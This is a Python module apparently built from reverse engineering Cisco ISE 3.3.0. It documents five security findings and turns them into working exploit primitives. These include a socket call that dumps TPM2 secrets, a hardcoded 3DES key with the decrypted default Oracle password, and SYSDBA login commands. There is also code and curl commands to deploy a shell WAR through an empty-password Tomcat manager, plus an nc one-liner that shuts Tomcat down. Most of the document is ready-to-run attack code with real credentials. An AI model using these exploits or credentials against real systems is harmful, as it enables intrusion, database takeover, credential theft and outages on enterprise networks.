"""
cisco_ise_re.py — Cisco ISE 3.3.0 static RE module

Target: ISE 3.3.0 x86_64 ISO
  /media/cowboy/research/cisco-firmware/ise/Cisco-ISE-3.3.0.430.SPA.x86_64.iso

Extraction chain:
  ISO (9660, label ADEOS) -> Extra/CARSisePkg1.rpm
  -> 7z -> cpio -> gzip tar bundle.tar
  -> CSCOcpm-common-3.3.0-430.x86_64.rpm -> 7z -> cpio
  -> /opt/CSCOcpm/ (Tomcat 9.0.73, JARs, shell scripts)
  -> CSCOcpm-key-manager -> key_manager Python aiohttp service

Application stack:
  - Apache Tomcat 9.0.73 at /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/
  - Oracle DB (cepm user, cpm10 SID) via JDBC thin driver, port 1521
  - vaservice Java daemon
  - ERS API on ports 9060/9061/9062 (External RESTful Services)
  - key_manager: Python aiohttp UNIX socket service
  - RabbitMQ (Docker container, ise-rabbitmq-container)

=== FINDINGS (ISE 3.3.0.430, confirmed 2026-08-25) ===

ISE-F1: key_manager UNIX socket — unauthenticated TPM2 secret dump [CRITICAL]
ISE-F2: Hardcoded 3DES key -> static Oracle DB credential [HIGH]
ISE-F3: Tomcat manager — empty-password account [HIGH]
ISE-F4: Hardcoded Tomcat shutdown secret [LOW]
ISE-F5: TLSv1/TLSv1.1 enabled on ERS port 8906 [MEDIUM]

=== ISE-F1: key_manager UNIX socket ===

Service: /usr/lib/python3.6/site-packages/ise_key_manager/server/key_manager_server.py
Socket:  /var/run/key_manager.sock  (UNIX domain, mode 0777)
Route:   GET /api/system/v1/key-manager/all_data

Routes registered in key_manager_server.py:
  app.router.add_get('/api/system/v1/key-manager/all_data', get_all_data)
  app.router.add_get('/api/system/v1/key-manager/data/{id}', get_data)
  app.router.add_post('/api/system/v1/key-manager/data', add_data)

get_all_data handler:
  Returns JSON dump of key_manager_cache — all stored TPM2 secrets.
  No authentication check on the UNIX socket.
  Any local process (SSRF pivot, service exploit, sudo misconfig) can call:
    curl --unix-socket /var/run/key_manager.sock http://localhost/api/system/v1/key-manager/all_data

Payload structure (from KEY_MANAGER_RECORD = /etc/ise/tpm2/key_manager_record.json):
  {"key_manager_passphrase": "<aes_passphrase>", "records": [...TPM2 sealed blobs...]}

Crypto: AES-CBC, SHA256(passphrase) as key, random IV prepended to ciphertext.
  If passphrase leaks via this endpoint, all TPM2-sealed secrets are recoverable.

Impact:
  - TPM2 sealed KEK (used to encrypt Oracle DB password in db.properties) extracted
  - Combined with ISE-F2: full Oracle DB password chain, even on rotated installs
  - Key manager passphrase directly enables offline decryption of all ISE secrets

=== ISE-F2: Hardcoded 3DES key — default Oracle DB credential ===

JAR:   PSP-Commons-3.3.0-430.jar
Class: com.cisco.epm.auth.encryptor.crypt.DefaultCryptEncryptor
Field: encryptionKey (set in <init>, offset 5): "ASDF asdf 1234 8983 jkla"

Bytecode evidence:
  5: ldc #2  // String ASDF asdf 1234 8983 jkla
  7: putfield #3  // Field encryptionKey:Ljava/lang/String;

staticInitMethod logic:
  if db.properties.KEK_KEY != null:
    newEncryptionKey = Base64.decode(TPMUtil.decrypt(KEK_KEY))  ; TPM-sealed path
    useNewKey = true
  else:
    useNewKey = false  ; default/pre-install state

encrypt() when useNewKey=false:
  key = encryptionKey.getBytes()  ; 24 bytes of "ASDF asdf 1234 8983 jkla"
  algo = "DESede"
  Crypt(algo, key)  ; SecretKeySpec(24-byte key, "DESede") -> 3DES-ECB

db.properties (shipped default):
  PDP_DB_PWD  = pTZv2LEjfGPX5YICzJb95g==
  PAP_DB_PWD  = pTZv2LEjfGPX5YICzJb95g==
  PAP_ADMIN_PWD = pTZv2LEjfGPX5YICzJb95g==
  ISE_DB_PWD  = pTZv2LEjfGPX5YICzJb95g==

Decryption:
  key = b'ASDF asdf 1234 8983 jkla'   # 24 bytes -> DESede-3 (K1=bytes[0:8], K2=bytes[8:16], K3=bytes[16:24])
  ct  = base64.decode("pTZv2LEjfGPX5YICzJb95g==")  # 16 bytes
  pt  = 3DES_ECB_decrypt(key, ct)
     = b'U0l1_6v#k3c\x05\x05\x05\x05\x05'  # PKCS5 padding valid

Default Oracle DB password (all accounts): U0l1_6v#k3c
  - cepm / cpm10 SID
  - mnt / mnt10 SID
  - strmadmin
  - sys (SYSDBA) — set by setdbpw.sh: resetOraclePw sys $DBADMINPWD
  - system — set by setdbpw.sh: resetOraclePw system $DBADMINPWD

Scope: applies to any ISE 3.3.0 deployment that has NOT completed cpminitialsetup.sh KEK rotation.
  Fully-initialized deployments use TPM-sealed KEK (AES-CBC path, useNewKey=true).
  ISE-F1 + ISE-F2 chain: F1 extracts TPM-sealed KEK passphrase -> decrypt KEK ->
    decrypt PAP_ADMIN_PWD from live db.properties -> Oracle SYSDBA access.

=== ISE-F3: Tomcat manager — empty-password account ===

File:  /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/conf/tomcat-users.xml
Entry: <user username="user" password="" roles="manager-script,manager-jmx,manager-status"/>

Roles granted:
  manager-script — /manager/text/ HTTP API: deploy/undeploy WAR, list, sessions
  manager-jmx    — /manager/jmxproxy/ JMX proxy for MBeans
  manager-status — /manager/status/ server status page

manager-script API endpoints (no additional auth beyond realm creds):
  PUT  /manager/text/deploy?path=/exploit      -> deploy WAR -> RCE
  GET  /manager/text/list                      -> enumerate deployed apps
  POST /manager/text/sessions?path=/exploit    -> session management

Exploitation:
  curl -u 'user:' 'http://<ise-host>:8080/manager/text/list'
  curl -u 'user:' -T shell.war 'http://<ise-host>:8080/manager/text/deploy?path=/shell'

Note: Tomcat manager is bound to Tomcat's internal port (likely 8080 or 443).
  ISE normally restricts external access; exploit is viable from same host or internal net.
  Tomcat shutdown (F4) + empty-password manager = full Tomcat takeover without network auth.

=== ISE-F4: Hardcoded Tomcat shutdown secret ===

File:  /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/conf/server.xml
Entry: <Server port="8005" shutdown="721AzznFfen8pMjy">

Shutdown is initiated by a plain TCP connection to port 8005 sending the secret string.
Identical across all ISE 3.3.0 installations (static in shipped ISO).

Exploit (from localhost or if port 8005 is reachable):
  echo -n '721AzznFfen8pMjy' | nc localhost 8005

Impact: Tomcat process termination -> ISE admin UI / ERS API / portal down (DoS).
  Useful as a forcing function during an incident to create outage window.

=== ISE-F5: TLSv1/TLSv1.1 on ERS port 8906 ===

File:  /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/conf/server.xml
Connector port="8906":
  sslEnabledProtocols="TLSv1,TLSv1.1,TLSv1.2"
  clientAuth="want"

Allows TLS 1.0/1.1 handshake. Enables:
  - POODLE (CVE-2014-3566) against TLSv1.0 CBC suites
  - BEAST (CVE-2011-3389) against TLSv1.0 CBC suites
  - Protocol downgrade to 1.0 if client and server both support it

clientAuth="want" means client cert is requested but not required -> optional mTLS.

=== ISE-F1+F2 Combined Chain ===

Local process (SSRF, cron, sudo, any ISE service running as non-root):
  1. curl --unix-socket /var/run/key_manager.sock http://localhost/api/system/v1/key-manager/all_data
     -> key_manager_passphrase = "<sha256_passphrase>"
  2. Decrypt key_manager AES ciphertext -> raw KEK bytes
  3. Read KEK_KEY from /opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/config/db.properties
  4. TPMUtil fallback path (pre-3.3 upgrade systems): KEK = Base64.decode(KEK_KEY) directly
  5. Use KEK as AES-128-CBC key + IV from PAP_ADMIN_PWD ciphertext
  6. Decrypt PAP_ADMIN_PWD -> Oracle SYS/SYSTEM password
  7. sqlplus system/<decrypted_pw>@localhost:1521/cpm10 as sysdba -> full DB access

Default-state shortcut (no KEK present):
  sqlplus cepm/U0l1_6v#k3c@localhost:1521/cpm10
  sqlplus system/U0l1_6v#k3c@localhost:1521/cpm10 as sysdba

"""

import os
import base64
import struct
import hashlib
from pathlib import Path
from typing import Optional


# ---------------------------------------------------------------------------
# ISE-F2: 3DES Oracle credential decryption
# ---------------------------------------------------------------------------

DEFAULT_ENCRYPT_KEY = b'ASDF asdf 1234 8983 jkla'  # 24 bytes, DESede key material
DEFAULT_DB_PWD_CT   = "pTZv2LEjfGPX5YICzJb95g=="    # shipped in db.properties


def decrypt_legacy_ise_db_password(ciphertext_b64: str, key: bytes = DEFAULT_ENCRYPT_KEY) -> str:
    """
    Decrypt an ISE db.properties password encrypted with the default 3DES-ECB key.

    Uses DefaultCryptEncryptor's legacy path (useNewKey=false):
      - Algorithm: DESede (3DES) in ECB mode, PKCS5 padding
      - Key: encryptionKey.getBytes() = "ASDF asdf 1234 8983 jkla" (24 bytes)
      - IV: none (ECB)

    Returns plaintext string with PKCS5 padding stripped.
    """
    from Crypto.Cipher import DES3
    ct = base64.b64decode(ciphertext_b64)
    cipher = DES3.new(key, DES3.MODE_ECB)
    pt_padded = cipher.decrypt(ct)
    pad_len = pt_padded[-1]
    return pt_padded[:-pad_len].decode('utf-8', errors='replace')


def decrypt_ise_db_password_from_kek(ciphertext_b64: str, kek_bytes: bytes) -> str:
    """
    Decrypt ISE db.properties password using a recovered KEK (AES-128-CBC path).

    After ISE initial setup, useNewKey=true and useCBCMode=true.
    Crypt(AES, kek_bytes, iv_bytes, AES_CBS_PADDING):
      - Algorithm: AES/CBC/PKCS5Padding
      - Key: kek_bytes (16 or 32 bytes)
      - IV: prepended to ciphertext (first 16 bytes) OR stored separately

    Check Crypt constructor: new Crypt("AES", newEncryptionKey, iv, AES_CBS_PADDING)
    The iv field is stored in DefaultCryptEncryptor.iv (byte[]).
    Ciphertext in db.properties is Base64 of IV+ciphertext or ciphertext alone.
    """
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    ct_raw = base64.b64decode(ciphertext_b64)
    if len(ct_raw) > 16 and len(ct_raw) % 16 == 0:
        iv = ct_raw[:16]
        ct = ct_raw[16:]
    else:
        iv = b'\x00' * 16
        ct = ct_raw
    key = kek_bytes[:16] if len(kek_bytes) >= 16 else kek_bytes.ljust(16, b'\x00')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt_padded = cipher.decrypt(ct)
    return unpad(pt_padded, 16).decode('utf-8', errors='replace')


# ---------------------------------------------------------------------------
# ISE-F1: key_manager UNIX socket probe
# ---------------------------------------------------------------------------

KEY_MANAGER_SOCK = "/var/run/key_manager.sock"
KEY_MANAGER_ALL_DATA_PATH = "/api/system/v1/key-manager/all_data"


def probe_key_manager_socket(sock_path: str = KEY_MANAGER_SOCK) -> Optional[dict]:
    """
    Call GET /api/system/v1/key-manager/all_data via key_manager UNIX socket.

    Requires: curl or Python socket, local access.
    Returns parsed JSON dict of all cached TPM2 secrets, or None on failure.

    Equivalent shell:
      curl -s --unix-socket /var/run/key_manager.sock \\
        http://localhost/api/system/v1/key-manager/all_data
    """
    import socket
    import json

    request = (
        f"GET {KEY_MANAGER_ALL_DATA_PATH} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(sock_path)
        sock.sendall(request)
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()
        header_end = response.find(b"\r\n\r\n")
        if header_end == -1:
            return None
        body = response[header_end + 4:]
        return json.loads(body.decode('utf-8', errors='replace'))
    except Exception:
        return None


# ---------------------------------------------------------------------------
# ISE-F3: Tomcat manager — empty-password WAR deploy
# ---------------------------------------------------------------------------

def check_tomcat_manager_auth(host: str, port: int = 8080, user: str = "user", password: str = "") -> bool:
    """
    Probe Tomcat manager /text/list with the empty-password account.
    Returns True if 200 OK with application list.
    """
    import urllib.request
    import urllib.error
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    url = f"http://{host}:{port}/manager/text/list"
    req = urllib.request.Request(url, headers={"Authorization": f"Basic {creds}"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status == 200
    except urllib.error.HTTPError as e:
        return e.code == 200
    except Exception:
        return False


def deploy_war_via_tomcat_manager(
    host: str,
    war_path: str,
    context_path: str = "/shell",
    port: int = 8080,
    user: str = "user",
    password: str = ""
) -> bool:
    """
    Deploy a WAR file via Tomcat manager-script API (empty-password user).
    Returns True if deployment succeeded (200 OK with "OK" body).

    Equivalent:
      curl -u 'user:' -T shell.war 'http://<host>:8080/manager/text/deploy?path=/shell'
    """
    import urllib.request
    import urllib.error
    import base64

    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
    url = f"http://{host}:{port}/manager/text/deploy?path={context_path}"
    with open(war_path, 'rb') as f:
        war_data = f.read()
    req = urllib.request.Request(url, data=war_data, method='PUT', headers={
        "Authorization": f"Basic {creds}",
        "Content-Type": "application/octet-stream",
        "Content-Length": str(len(war_data)),
    })
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read().decode()
            return resp.status == 200 and body.startswith("OK")
    except Exception:
        return False


# ---------------------------------------------------------------------------
# ISE-F4: Tomcat shutdown via hardcoded secret
# ---------------------------------------------------------------------------

TOMCAT_SHUTDOWN_SECRET = "721AzznFfen8pMjy"
TOMCAT_SHUTDOWN_PORT   = 8005


def send_tomcat_shutdown(host: str = "localhost", port: int = TOMCAT_SHUTDOWN_PORT,
                         secret: str = TOMCAT_SHUTDOWN_SECRET) -> bool:
    """
    Send Tomcat shutdown command using the hardcoded secret shipped in ISE 3.3.0 server.xml.
    Returns True if connection succeeded (Tomcat may or may not be listening on 8005 externally).
    """
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.sendall(secret.encode())
        sock.close()
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# ISE-F1+F2 chain: local TPM secret extraction -> Oracle credential
# ---------------------------------------------------------------------------

def ise_local_full_chain(db_props_path: str = "/opt/CSCOcpm/appsrv/apache-tomcat-9.0.73/config/db.properties") -> dict:
    """
    Execute full ISE-F1+F2 local privilege chain:
      1. Probe key_manager socket -> extract passphrase
      2. Read KEK_KEY from db.properties
      3. Decrypt Oracle DB password

    Returns dict with extracted secrets.
    """
    result = {}

    # Step 1: key_manager dump
    km_data = probe_key_manager_socket()
    if km_data:
        result['key_manager_dump'] = km_data
        result['key_manager_passphrase'] = km_data.get('key_manager_passphrase')

    # Step 2: read db.properties
    props = {}
    try:
        with open(db_props_path) as f:
            for line in f:
                line = line.strip()
                if '=' in line and not line.startswith('#'):
                    k, _, v = line.partition('=')
                    props[k.strip()] = v.strip()
    except Exception as e:
        result['db_props_error'] = str(e)

    result['db_props'] = props

    # Step 3: decrypt
    kek_key = props.get('KEK_KEY')
    pap_admin_pwd = props.get('PAP_ADMIN_PWD', DEFAULT_DB_PWD_CT)

    if kek_key is None:
        # Default/pre-setup state: use hardcoded 3DES key
        try:
            plaintext = decrypt_legacy_ise_db_password(pap_admin_pwd)
            result['oracle_password'] = plaintext
            result['oracle_path'] = 'legacy_3des'
        except Exception as e:
            result['decrypt_error'] = str(e)
    else:
        # KEK present: try TPM fallback (pre-3.3 upgrade path = raw base64)
        try:
            kek_bytes = base64.b64decode(kek_key)
            plaintext = decrypt_ise_db_password_from_kek(pap_admin_pwd, kek_bytes)
            result['oracle_password'] = plaintext
            result['oracle_path'] = 'kek_fallback'
        except Exception as e:
            result['kek_decrypt_error'] = str(e)

    return result


# ---------------------------------------------------------------------------
# Ablation registration
# ---------------------------------------------------------------------------

MODULE_META = {
    "name": "cisco_ise_re",
    "version": "1.0.0",
    "target": "Cisco ISE 3.3.0.430",
    "findings": ["ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5"],
    "critical": ["ISE-F1", "ISE-F2"],
    "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
    "primitives": [
        "decrypt_legacy_ise_db_password",
        "decrypt_ise_db_password_from_kek",
        "probe_key_manager_socket",
        "check_tomcat_manager_auth",
        "deploy_war_via_tomcat_manager",
        "send_tomcat_shutdown",
        "ise_local_full_chain",
    ],
}
